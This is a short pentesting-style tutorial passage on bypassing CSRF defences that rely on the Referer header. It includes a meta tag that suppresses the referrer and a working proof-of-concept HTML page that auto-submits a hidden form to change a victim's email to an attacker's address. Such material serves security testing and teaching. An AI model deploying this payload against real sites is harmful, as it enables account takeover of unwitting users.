Some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. The following are possible bypasses for the `Referer` header based CSRF protection.

#### Referer Header Omitted

Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted. The following code will drop the `referer` header.

```
<meta name="referrer" content="never">
```

PoC

```
<html>
    <body>
        <meta name="referrer" content="never">
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
